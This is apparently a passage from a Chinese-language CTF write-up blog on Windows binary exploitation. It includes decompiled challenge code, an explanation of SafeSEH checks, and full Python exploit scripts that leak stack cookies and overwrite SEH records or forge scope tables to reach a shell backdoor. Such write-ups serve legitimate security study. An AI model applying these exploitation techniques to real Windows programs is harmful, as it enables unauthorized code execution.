str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode name:"</span>, <span class="string">"AAA"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode description:"</span>, <span class="string">"AAA"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode:"</span>, shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"shellcode index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_challenge_code</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Your challenge code is "</span>)</span><br><span class="line">    secret = p.recvline().strip().split(<span class="string">'-'</span>)</span><br><span class="line">    value_array = [int(item, <span class="number">16</span>) <span class="keyword">for</span> item <span class="keyword">in</span> secret]</span><br><span class="line">    p.sendlineafter(<span class="string">"challenge response:"</span>, <span class="string">"AAA"</span>)</span><br><span class="line">    <span class="keyword">return</span> value_array</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_buf</span><span class="params">(val)</span>:</span></span><br><span class="line">    buf = [val]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">        buf.append((buf[<span class="number">-1</span>] * <span class="number">0x10DCD</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        buf.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(buf, key)</span>:</span></span><br><span class="line">    v0 = ((<span class="number">1</span> &lt;&lt; <span class="number">8</span>) + key - <span class="number">1</span>) &amp; <span class="number">0x1F</span></span><br><span class="line">    v2 = buf[(key + <span class="number">3</span>) &amp; <span class="number">0x1F</span>] ^ buf[key] ^ (buf[(key + <span class="number">3</span>) &amp; <span class="number">0x1F</span>] &gt;&gt; <span class="number">8</span>)</span><br><span class="line">    buf[<span class="number">32</span>] = buf[v0]</span><br><span class="line">    v1 = buf[<span class="number">32</span>]</span><br><span class="line">    buf[<span class="number">33</span>] = v2</span><br><span class="line">    v3 = buf[(key + <span class="number">10</span>) &amp; <span class="number">0x1F</span>]</span><br><span class="line">    v4 = buf[((<span class="number">1</span> &lt;&lt; <span class="number">8</span>) + key - <span class="number">8</span>) &amp; <span class="number">0x1F</span>] ^ v3 ^ (((v3 ^ (<span class="number">32</span> * buf[((<span class="number">1</span> &lt;&lt; <span class="number">8</span>) + key - <span class="number">8</span>) &amp; <span class="number">0x1F</span>])) &lt;&lt; <span class="number">14</span>) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    v5 = key &amp; <span class="number">0xFF</span></span><br><span class="line">    buf[<span class="number">34</span>] = v4</span><br><span class="line">    buf[key] = v2 ^ v4</span><br><span class="line">    buf[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (<span class="number">16</span> * (v1 ^ (<span class="number">4</span> * v4)))) &lt;&lt; <span class="number">7</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    key = ((<span class="number">1</span> &lt;&lt; <span class="number">8</span>) + v5 - <span class="number">1</span>) &amp; <span class="number">0x1F</span></span><br><span class="line">    <span class="keyword">return</span> buf, key, buf[key]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce_scmgr</span><span class="params">(value_array)</span>:</span></span><br><span class="line">    final_res = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> high2bytes <span class="keyword">in</span> range(<span class="number">0x10000</span>):</span><br><span class="line">        addr = (high2bytes &lt;&lt; <span class="number">16</span>) | <span class="number">0x1090</span></span><br><span class="line">        buf = init_buf(addr)</span><br><span class="line">        key = <span class="number">0</span></span><br><span class="line">        success = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> value_array[::<span class="number">-1</span>]:</span><br><span class="line">            buf, key, res = encrypt(buf, key)</span><br><span class="line">            <span class="comment"># print(buf)</span></span><br><span class="line">            <span class="keyword">if</span> res != item:</span><br><span class="line">                success = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> success == <span class="literal">True</span>:</span><br><span class="line">            final_res = high2bytes &lt;&lt; <span class="number">16</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> final_res</span><br><span class="line"></span><br><span class="line">leave_name(<span class="string">"A"</span> * <span class="number">0x10</span> + <span class="string">"addr"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"addr"</span>)</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">old_ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">text_base = u32(p.recv(<span class="number">4</span>).strip().ljust(<span class="number">4</span>, <span class="string">"\x00"</span>)) - <span class="number">0x1AFA</span></span><br><span class="line">ebp_of_main = old_ebp - <span class="number">0x48</span></span><br><span class="line">security_cookie = canary ^ ebp_of_main</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(text_base &amp; <span class="number">0xFFFF</span> == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line">cipher_array = read_challenge_code()</span><br><span class="line">scmgr = bruteforce_scmgr(cipher_array)</span><br><span class="line"><span class="keyword">assert</span>(scmgr != <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">backdoor = scmgr + <span class="number">0x1100</span></span><br><span class="line">except_handler4 = text_base + <span class="number">0x18A0</span></span><br><span class="line">ebp_of_run = ebp_of_main - <span class="number">0x34</span></span><br><span class="line">buf_addr = ebp_of_run - <span class="number">0x80</span></span><br><span class="line">prev_seh = ebp_of_main + <span class="number">0x38</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x70</span> <span class="comment"># padding</span></span><br><span class="line">payload += p32(prev_seh) + p32(backdoor) <span class="comment"># | next | exception_handler</span></span><br><span class="line"></span><br><span class="line">add(len(payload), payload)</span><br><span class="line">run(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] scmgr address is: "</span> + hex(scmgr))</span><br><span class="line">print(<span class="string">"[+] text base is: "</span> + hex(text_base))</span><br><span class="line">print(<span class="string">"[+] security_cookie is: "</span> + hex(security_cookie))</span><br><span class="line">print(<span class="string">"[+] ebp of main is: "</span> + hex(ebp_of_main))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="Windows-HITBGSEC-BABYSTACK-amp-Windows-第五空间-2019-决赛-PWN9-amp-Windows-SUCTF-2019-BabyStack"><a href="#Windows-HITBGSEC-BABYSTACK-amp-Windows-第五空间-2019-决赛-PWN9-amp-Windows-SUCTF-2019-BabyStack" class="headerlink" title="[Windows][HITBGSEC]BABYSTACK &amp; [Windows][第五空间 2019 决赛]PWN9 &amp; [Windows][SUCTF 2019]BabyStack"></a>[Windows][HITBGSEC]BABYSTACK &amp; [Windows][第五空间 2019 决赛]PWN9 &amp; [Windows][SUCTF 2019]BabyStack</h1><h2 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先该程序开启了SafeSEH保护（虽然winchecksec没识别出来）。<br>其次该程序逻辑十分简单：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *v3; <span class="comment">// eax</span></span><br><span class="line">    FILE *v4; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// [esp+20h] [ebp-C0h]</span></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [esp+24h] [ebp-BCh]</span></span><br><span class="line">    _DWORD *v7; <span class="comment">// [esp+28h] [ebp-B8h]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-B4h]</span></span><br><span class="line">    <span class="keyword">char</span> v9[<span class="number">128</span>]; <span class="comment">// [esp+44h] [ebp-9Ch] BYREF</span></span><br><span class="line">    CPPEH_RECORD ms_exc; <span class="comment">// [esp+C8h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">    v3 = (FILE *)_acrt_iob_func(<span class="number">1</span>);</span><br><span class="line">    setvbuf(v3, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    v4 = (FILE *)_acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">    setvbuf(v4, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"ouch! Do not kill me , I will tell you everything"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack address = 0x%x\n"</span>, v9);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"main address = 0x%x\n"</span>, main);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Do you want to know more?"</span>);</span><br><span class="line">        read_str((<span class="keyword">int</span>)v9, <span class="number">10</span>);</span><br><span class="line">        v6 = <span class="built_in">strcmp</span>(v9, <span class="string">"yes"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        v6 = v6 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        &#123;</span><br><span class="line">        v5 = <span class="built_in">strcmp</span>(v9, <span class="string">"no"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v5 )</span><br><span class="line">            v5 = v5 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        read_str((<span class="keyword">int</span>)v9, <span class="number">256</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Where do you want to know"</span>);</span><br><span class="line">        v7 = (_DWORD *)read_n();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Address 0x%x value is 0x%x\n"</span>, v7, *v7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I can tell you everything, but I never believe 1+1=2"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"AAAA, you kill me just because I don't think 1+1=2??"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最开始的时候，<code>main</code>地址和栈地址都给出了；后面又给了10次任意地址读的机会，如果输入”no”，则会提供一次栈溢出的机会；此外，程序还提供了getshell的后门:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>001B138D                 <span class="keyword">push</span>    offset Command  <span class="comment">; "cmd"</span></span><br><span class="line"><span class="symbol">.text:</span>001B1392                 <span class="keyword">call</span>    <span class="built_in">ds</span>:system</span><br></pre></td></tr></table></figure>

<p>不过由于开了SafeSEH，如果用BABYSHELLCODE的方法覆盖<code>exception_handler</code>，则无法通过check，所以这里需要了解一下SafeSEH在普通SEH基础上添加了什么。</p>
<h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><p>SafeSEH简单来说，就是在SEH的基础上，添加了额外的check。<br>当异常发生时，异常处理过程<code>RtlDispatchException</code>首先检查异常处理节点是否在栈上, 如果不在栈上程序将终止异常处理, 其次检查异常处理<code>Handler</code>是否在栈上, 如果在栈上程序将止异常处理. 最后检测调用<code>RtlIsValidHandler</code>检测<code>Handler</code>有效性：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">RtlIsValidHandler</span><span class="params">(handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 在加载模块的进程空间</span></span><br><span class="line">    <span class="keyword">if</span> (handler is in an <span class="built_in">image</span>) <span class="comment">// step 1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="built_in">set</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE; <span class="comment">// 该标志设置，忽略异常处理，直接返回FALSE</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> has a SafeSEH table) <span class="comment">// 是否含有SEH表</span></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)</span><br><span class="line">                <span class="keyword">return</span> TRUE; <span class="comment">// 异常处理handle在表中，返回TRUE</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE; <span class="comment">// 异常处理handle不在表中，返回FALSE</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> is a .NET assembly with the ILonly flag <span class="built_in">set</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE; <span class="comment">// .NET 返回FALSE</span></span><br><span class="line">        <span class="comment">// fall through</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// handle在不可执行页上面</span></span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page) <span class="comment">// step 2</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable <span class="built_in">bit</span> <span class="built_in">set</span> in the <span class="built_in">process</span> flags)</span><br><span class="line">            <span class="keyword">return</span> TRUE; <span class="comment">// DEP关闭，返回TRUE；否则抛出异常</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION; <span class="comment">// enforce DEP even if we have no hardware NX</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 在加载模块内存之外，并且是可执行页</span></span><br><span class="line">    <span class="keyword">if</span> (handler is <span class="keyword">not</span> in an <span class="built_in">image</span>) <span class="comment">// step 3</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable <span class="built_in">bit</span> <span class="built_in">set</span> in the <span class="built_in">process</span> flags)</span><br><span class="line">            <span class="keyword">return</span> TRUE; <span class="comment">// 允许在加载模块内存空间外执行，返回验证成功</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE; <span class="comment">// don't allow handlers outside of images</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// everything else is allowed</span></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面伪代码里的<code>ExecuteDispatchEnable</code>和<code>ImageDispatchEnable</code>标志用来控制<code>Handler</code>在不可执行内存或者不在异常模块的映像内时, 是否可以执行。默认情况下, 如果进程DEP开启, 两位为0, DEP关闭, 两位为1。</p>
<h2 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li>利用任意地址读，把栈上的cookie给leak出来。</li>
<li>利用栈溢出，在栈上伪造一个<code>_EH4_SCOPETABLE</code>结构，使得<code>FilterFunc</code>为backdoor；同时绕过所有的check，保证异常处理流程正确执行到<code>FilterFunc</code>上。</li>
</ol>
<blockquote>
<p>从上面SEH原理分析<code>_except_handler4_common</code>的流程时，注意到先会检查<code>FilterFunc</code>是否为空再依次执行<code>FilterFunc</code>和<code>HandlerFunc</code>；但在实际调试过程中发现，即使<code>FilterFunc == NULL</code>，设置<code>HandlerFunc = backdoor</code>最终也能getshell，只是相比之下会延迟一段时间。<br>由于<code>_except_handler4_common</code>代码也是借用其他师傅博客里的，中间省略的部分也不知从何获得，所以暂时还不知道原因。</p>
</blockquote>
<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x10b0</span></span><br><span class="line">target = <span class="number">0x139B</span></span><br><span class="line">__security_cookie_offset = <span class="number">0x4004</span></span><br><span class="line">backdoor = <span class="number">0x138D</span></span><br><span class="line">handler = <span class="number">0x1460</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./babystack.exe"</span>)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote('node3.buuoj.cn', 26510)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"stack address = 0x"</span>)</span><br><span class="line">stack_address = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">cookie_address = stack_address + <span class="number">0x80</span></span><br><span class="line">p.recvuntil(<span class="string">"main address = 0x"</span>)</span><br><span class="line">main_address = int(p.recv(<span class="number">6</span>), <span class="number">16</span>)</span><br><span class="line">target_address = main_address - main + target</span><br><span class="line">__security_cookie_address = main_address - main + __security_cookie_offset</span><br><span class="line">backdoor_address = main_address - main + backdoor</span><br><span class="line">exception_handler = main_address - main + handler</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak cookie</span></span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to know more?"</span>, <span class="string">"yes"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Where do you want to know"</span>, str(cookie_address))</span><br><span class="line">p.recvuntil(<span class="string">"value is 0x"</span>)</span><br><span class="line">cookie = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak __security_cookie</span></span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to know more?"</span>, <span class="string">"yes"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Where do you want to know"</span>, str(__security_cookie_address))</span><br><span class="line">p.recvuntil(<span class="string">"value is 0x"</span>)</span><br><span class="line">__security_cookie = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake scope table</span></span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to know more?"</span>, <span class="string">"go"</span>)</span><br><span class="line">payload = <span class="string">"AAAA"</span> </span><br><span class="line"><span class="comment"># | __security_cookieCookieOffset | __security_cookieCookieXorOffset | EHCookieOffset | EHCookieXorOffset |</span></span><br><span class="line">payload += p32(<span class="number">0xffffffe4</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xffffff20</span>) + p32(<span class="number">0</span>) </span><br><span class="line"><span class="comment"># | EnclosingLevel | FilterFunc | HandlerFunc |</span></span><br><span class="line">payload += p32(<span class="number">0xfffffffe</span>) + p32(<span class="number">0</span>) + p32(backdoor_address)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'A'</span>) <span class="comment"># padding</span></span><br><span class="line">payload += p32(cookie) <span class="comment"># cookie</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># padding</span></span><br><span class="line"><span class="comment"># | next | exception_handler | scope_table ^ security_cookie | TryLevel |</span></span><br><span class="line">payload += p32(stack_address + <span class="number">0xd4</span>) + p32(exception_handler) + p32(__security_cookie ^ (stack_address + <span class="number">4</span>)) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to know more?"</span>, <span class="string">'yes'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Where do you want to know"</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Windows-Insomni’hack-Teaser-2017-Easywin"><a href="#Windows-Insomni’hack-Teaser-2017-Easywin" class="headerlink" title="[Windows][Insomni’hack Teaser 2017]Easywin"></a>[Windows][Insomni’hack Teaser 2017]Easywin</h1><h2 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先winchecksec一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  winchecksec.exe .\easywin.exe</span><br><span class="line">Results for: .\easywin.exe</span><br><span class="line">Dynamic Base    : &quot;Present&quot;</span><br><span class="line">ASLR            : &quot;Present&quot;</span><br><span class="line">High Entropy VA : &quot;Present&quot;</span><br><span class="line">Force Integrity : &quot;NotPresent&quot;</span><br><span class="line">Isolation       : &quot;Present&quot;</span><br><span class="line">NX              : &quot;Present&quot;</span><br><span class="line">SEH             : &quot;Present&quot;</span><br><span class="line">CFG             : &quot;Present&quot;</span><br><span class="line">RFG             : &quot;NotPresent&quot;</span><br><span class="line">SafeSEH         : &quot;NotApplicable&quot;</span><br><span class="line">GS              : &quot;Present&quot;</span><br><span class="line">Authenticode    : &quot;NotPresent&quot;</span><br><span class="line">.NET            : &quot;NotPresent&quot;</span><br></pre></td></tr></table></figure>
<p>需要注意的是这里开启了CFG保护，至于CFG保护的原理后文会提到。</p>
<p>题目逻辑比较简单，主要是<code>add</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Type?\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" d - Droideka\n b - B1 Battle Droid\n p - Probe Droid\n i - IG-88\n~~~~~~~~~~~~~~~~~~~~~~\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>, v9);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> (v9[<span class="number">0</span>] == <span class="string">'b'</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">switch</span> (v9[<span class="number">0</span>])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">            strcpy_s(v5 + <span class="number">256</span>, <span class="number">0x100</span>ui64, <span class="string">"[+] A Droideka lands on %1$s (%2$d, %3$d).\n"</span>);</span><br><span class="line">            *((_QWORD *)v5 + <span class="number">64</span>) = func_msg1;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'i'</span>:</span><br><span class="line">            strcpy_s(v5 + <span class="number">256</span>, <span class="number">0x100</span>ui64, <span class="string">"[+] IG-88 has a bounty of %$2d%$3d$ on planet %$1s.\n"</span>);</span><br><span class="line">            *((_QWORD *)v5 + <span class="number">64</span>) = func_msg2;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'p'</span>:</span><br><span class="line">            strcpy_s(v5 + <span class="number">256</span>, <span class="number">0x100</span>ui64, <span class="string">"[+] Probe Droid arrived on planet %$1s after %$2d days and %$3d hours...\n"</span>);</span><br><span class="line">            *((_QWORD *)v5 + <span class="number">64</span>) = func_msg3;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        